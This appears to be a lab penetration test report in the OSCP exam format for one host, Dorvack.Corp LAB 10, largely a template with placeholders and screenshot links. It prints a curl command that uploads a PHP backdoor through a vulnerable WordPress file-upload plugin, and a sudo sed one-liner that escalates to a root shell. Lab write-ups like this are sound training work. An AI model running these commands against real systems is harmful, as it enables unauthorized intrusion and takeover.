![image](https://github.com/user-attachments/assets/b6e362c9-0bb2-495d-a442-ee52fe1caa4b)

#Penetration Test Report Dorvack.Corp LAB 10
**Version**: 3.2  
**OSID**: XXXXX  
**Email**: ericgon28@proton.me 

![OSCP Logo](https://github.com/user-attachments/assets/d6b50208-9978-426d-bdd3-6cffcd6778c7)

> © All rights reserved to Offensive Security, 2025  
> No part of this publication, in whole or in part, may be reproduced, copied, transferred or any other right reserved to its copyright owner without prior written permission from Offensive Security.

---

## Table of Contents
1. [Offensive Security Exam Penetration Test Report](#1-offensive-security-exam-penetration-test-report)
   - [1.1 Introduction](#11-introduction)  
   - [1.2 Objective](#12-objective)  
   - [1.3 Requirements](#13-requirements)  
2. [High-Level Summary](#2-high-level-summary)  
   - [2.1 Recommendations](#21-recommendations)  
3. [Methodologies](#3-methodologies)  
   - [3.1 Information Gathering](#31-information-gathering)  
   - [3.2 Penetration](#32-penetration)  
   - [3.3 Maintaining Access](#33-maintaining-access)  
   - [3.4 House Cleaning](#34-house-cleaning)  
4. [Additional Items](#4-additional-items)  

---

## 1. Offensive Security Exam Penetration Test Report

### 1.1 Introduction
The Offensive Security Exam penetration test report outlines all actions and efforts taken during the Offensive Security exam. This report is graded based on the thoroughness, accuracy, and completion of each aspect of the exam. It ensures the student demonstrates an in-depth understanding of penetration testing methodologies as well as the technical knowledge required to earn the Offensive Security Certified Professional (OSCP) certification.

### 1.2 Objective
The objective is to perform an internal penetration test on the Offensive Security Exam network. The student must follow a systematic approach to achieving the assigned goals. This test simulates an actual penetration test, from start to finish, and includes a comprehensive report.

### 1.3 Requirements
The student is required to fill out this report fully, including the following sections:
- High-level summary and recommendations (non-technical)
- Detailed methodology outline
- Each finding with screenshots, walkthroughs, sample code, and proof.txt if applicable
- Additional items if not included in previous sections

---

## 2. High-Level Summary

### Compromised Hosts
- **172.20.0.235 (Dorvack.corp)** – Initial exploit used  
---

### 2.1 Recommendations
It is recommended that the identified vulnerabilities be patched immediately to prevent exploitation. These systems require regular updates and patches to avoid future breaches.

---

## 3. Methodologies

### 3.1 Information Gathering
Information gathering is critical in penetration testing. In this case, the scope of the test covered the following IP addresses:
- `172.20.0.235`

---

### 3.2 Penetration

#### System IP: `172.20.0.235`

**Service Enumeration:**
- **Server IP Address:** 172.20.0.235 

| Protocol | Port(s)       |
|----------|---------------|
| TCP      | 22, 80        |
| UDP      |               |

- **Nmap Scan Results:**

 ![image](https://github.com/user-attachments/assets/9f843fd1-2981-4afd-89d2-71ad84bdee7b)

![image](https://github.com/user-attachments/assets/af8b35c6-89c5-450a-8d79-1471319d0cea)

![image](https://github.com/user-attachments/assets/c8851231-bb5c-480d-a341-82cb2ad8d016)

![image](https://github.com/user-attachments/assets/fa371d76-8a16-48b1-a301-69c1b9fcb702)

![image](https://github.com/user-attachments/assets/36d0b4bb-04fa-4560-bbc4-c8af5a773d90)

![image](https://github.com/user-attachments/assets/abc8099d-5ee5-475b-82a3-0630ccbf6b5a)

![image](https://github.com/user-attachments/assets/8b436fe9-eddb-48fd-bcbb-8280d0a8ab09)

![image](https://github.com/user-attachments/assets/ecdb2d65-b016-42bb-8d6f-af01f8bf3cd0)


##### Initial Shell Vulnerability Exploited  

- _Insert details here_  
- **Vulnerability Explanation:**  
  _Explanation here_  
- **Vulnerability Fix:**  
  _Fix info here_  
- **Severity:** High / Critical
- **Proof of Concept Code:**
  
```bash
 curl -k -X POST -F "action=upload" -F "files=@./backdoor.php" http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php
 ```

![image](https://github.com/user-attachments/assets/6f2c1dfd-c681-4a00-9bf1-9506e2058227)

![image](https://github.com/user-attachments/assets/cad4ec11-9adb-4e8a-b371-4ffb99a5c425)

![image](https://github.com/user-attachments/assets/349c08b6-8f66-452b-98ca-0e8dc5455290)

![image](https://github.com/user-attachments/assets/f35a9fb6-d30d-4303-9fcb-0a57b7f94b23)

RevShell

![image](https://github.com/user-attachments/assets/2aca672f-1a13-45e1-817d-385a45111b19)

![image](https://github.com/user-attachments/assets/388f5222-60d5-4fcd-8df7-de98814c26a3)

![image](https://github.com/user-attachments/assets/dd37914a-5946-4cb4-8f01-9a041cd06cb8)

![image](https://github.com/user-attachments/assets/bc5e6c2d-17b4-4414-bcb4-75189ec0c3bf)

![image](https://github.com/user-attachments/assets/412cf8d8-6408-4a0b-b547-6d1945999f39)

![image](https://github.com/user-attachments/assets/293deb1b-57a5-4df2-8c5b-64052a766b69)

**flag.txt Contents:**

```
flag{
```

![image](https://github.com/user-attachments/assets/6ff8a440-8018-43fb-b3e7-a086e67b0ead)

![image](https://github.com/user-attachments/assets/dc50f0be-efa5-4626-b195-5dd113a57da9)

![image](https://github.com/user-attachments/assets/a5732ff3-ccd2-4ed7-8b3d-a0310c41bd4f)

![image](https://github.com/user-attachments/assets/642c4142-da2c-4c1c-8f6c-ce4f800b399a)

![image](https://github.com/user-attachments/assets/12847f5e-e6f7-49fe-9c6f-6582f4b44043)

![image](https://github.com/user-attachments/assets/edbb9fc0-7fc6-421f-a8dd-91b4b2cf0e07)

![image](https://github.com/user-attachments/assets/b1d527b3-0bfd-4e59-a40c-c99c035294b6)

![image](https://github.com/user-attachments/assets/44c920bf-6d0e-465e-952a-fcc1023d2a85)

![image](https://github.com/user-attachments/assets/9e13cf54-1450-48a5-afde-31cbf90d145b)

![image](https://github.com/user-attachments/assets/908b9b68-efb9-4ac4-93f2-3d1429280539)


##### Privilege Escalation

- **Vulnerability Exploited:**  
  _Exploit name here_  
- **Vulnerability Explanation:**  
  _Explanation here_  
- **Vulnerability Fix:**  
  _Fix here_  
- **Severity:** High  
- **Exploit Code:**  
  ```bash
  sudo sed -n '1e exec sh 1>&0' /etc/hosts
  ```

![image](https://github.com/user-attachments/assets/cbe68821-97de-4f66-881d-8eb959706501)

![image](https://github.com/user-attachments/assets/5aa87ea4-3d3d-45f4-824a-5cac0a752042)


##### Root Screenshot

**root.txt Contents:**
```
insert hash or content
```

**End of Report**
